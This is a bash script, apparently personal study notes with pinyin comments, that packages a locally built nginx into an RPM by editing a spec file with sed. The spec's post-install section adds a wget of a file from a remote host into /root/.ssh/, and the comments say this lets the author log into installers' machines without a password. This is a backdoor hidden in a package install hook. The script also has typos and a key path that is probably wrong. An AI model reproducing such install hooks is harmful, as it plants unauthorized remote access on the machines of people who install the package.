#!/bin/bash

#mudi: ba anzhuang hao de wenjian dabao cheng rpm bao

yum -y install rpm-build

#Installed:
#  rpm-build.x86_64 0:4.11.3-46.el7_9                                                                                                                              

#Dependency Installed:
#  dwz.x86_64 0:0.11-3.el7               patch.x86_64 0:2.7.1-12.el7_7                   perl-Thread-Queue.noarch 0:3.02-2.el7  perl-srpm-macros.noarch 0:1-8.el7 
#  python-srpm-macros.noarch 0:3-34.el7  redhat-rpm-config.noarch 0:9.1.0-88.el7.centos

#######################################################################################--------->shengcheng rpm kongwenjianjia
rpmbuild -ba XXX.spec
#cuowu, yonglai shengcheng rpmbuild
#diyici chuangjian yong; xuyao duoge mulu

ls ~/rpmbuild/

#BUILD  BUILDROOT  RPMS  SOURCES  SPECS  SRPMS

#cankao 045install_nginx anzhuang bing peizhi ngix

#######################################################################################--------->chuangjian tar.gzbao
rm -rf /usr/local/nginx/nginx-1.12.2.tar.gz
#shanchu zhiqian de moren tar bao
tar -zcvf /usr/local/nginx/nginx-1.12.2.tar.gz /usr/local/nginx 
#bao yijing anzhuang peizhi hao de chengxu dacheng tar.gz bao
#-z
#-c create
#-v
#-f file

/bin/cp -rf /usr/local/nginx/nginx-1.12.2.tar.gz ~/rpmbuild/SOURCES
#yuanma bao kaobei dao SOURCES

#######################################################################################--------->peizhi spec
###################################--------->xinjian spec wenjian
#peizhi specs peizhiwenjian
touch ~/rpmbuild/SPECS/080nginx.spec
#fuzhi beiyong spec wenjian
#vim chuangjian cai nengyong; touch de wenjian yongbuliao
#tiqian chuangjian hao kongwenjian
cat ~/cloud_linux/079blank.spec > ~/rpmbuild/SPECS/080nginx.spec

###################################--------->jiben xinxi
#Name\Version\Source0 bunengcuo
sed -i '/Name/s/:/:nginx/g' ~/rpmbuild/SPECS/080nginx.spec 
#yuanma bao mingcheng
sed -i '/Version/s/:/:1.12.2/g' ~/rpmbuild/SPECS/080nginx.spec
#yuanma bao banben

#sed -i '/Release/s/:/:10/g' ~/rpmbuild/SPECS/080nginx.spec
#RPM bao banben
#shiyong moren 1%{?dist}

sed -i '/Summary/s/:/:nginx is webserver/g' ~/rpmbuild/SPECS/080nginx.spec
#RPM bao miaoshu

sed -i '/Group/s/Group/#Group/g' ~/rpmbuild/SPECS/080nginx.spec
#yum gropinstall
#yum grouplist 
#buxuyao zhushidiao

sed -i '/License/s/:/:GPL/g' ~/rpmbuild/SPECS/080nginx.spec
sed -i '/URL/s/:/1.116.26.230/g' ~/rpmbuild/SPECS/080nginx.spec
sed -i '/Source0/s/:/:nginx-1.12.2.tar.gz/g' ~/rpmbuild/SPECS/080nginx.spec
sed -i '/BuildRequires/s/BuildRequires/#BuildRequires/g' ~/rpmbuild/SPECS/080nginx.spec
#zhizuo RPM bao de yilai
#zhushi diao

sed -i '/Requires/s/Requires/#Requires/g' ~/rpmbuild/SPECS/080nginx.spec
#anzhuang RPM bao de yilai
#sed -i '//s///g' ~/rpmbuild/SPECS/080nginx.spec
#zhushi diao

###################################--------->anzhuangqian-prep
sed -i '/\%setup/s/\%setup/setup/g' ~/rpmbuild/SPECS/080nginx.spec
#jieya bing cd jinru mulu

sed -i '/%configure/s#%configure#\.\/configure#g' ~/rpmbuild/SPECS/080nginx.spec
#xiugai geizhi

sed -i '/\%doc/a \
/usr/local/nginx/*' ~/rpmbuild/SPECS/080nginx.spec
#dui naxie wenjian dabao

###################################--------->anzhuohou-post
sed -i '/\%prep/a \
\%post \
echo "zheshi rpm dabao de nginx" > /usr/local/nginx>html/index.html \
wget http://XXX -O /root/.ssh/id_rsa.pub \
useradd -u 1000 -g 1000 nginx -s /sbin/nologin ' ~/rpmbuild/SPECS/080nginx.spec
#feibixu; anzhaunghou jiaoben 
#chuangjian zhanghu
#keyi zhixing duotiao mingling
#wget http://1.116.26.230/id_rsa.pub -O /root/.ssh/
#jiang zhengshu(gongyao) xiazai dao yonghu de diannao; buyong mima keyi denglu jiqi


#######################################################################################--------->rebuild chongxin chuangjian nginx.spec
rpmbuild -ba ~/rpmbuild/SPECS/080nginx.spec




#cd /usr/local
#tar -czf nginx.rpm /usr/local/nginx
#-c create xinjian
#-z gzip
#-f file wenjian


#######################################################################################--------->qitaren anzhaung rpm bao
rpm -ivh nginx-1.12.2-1.e17.centos.x86_64.rpm
#yum -y install nginx-1.12.2-1.e17.centos.x86_64.rpm
#-i install package
#-v verbose shuchu xijie
#-h hash peihe -v

#mydate=$(date +'%Y%m%d %H:%M:%S')
#/bin/cp -rf /usr/local/nginx.rpm ~/cloud_linux/080_$mydate_nginx.rpm
#fuzhi dao github cangku
#qiangzhi feijiaohu fuzhi


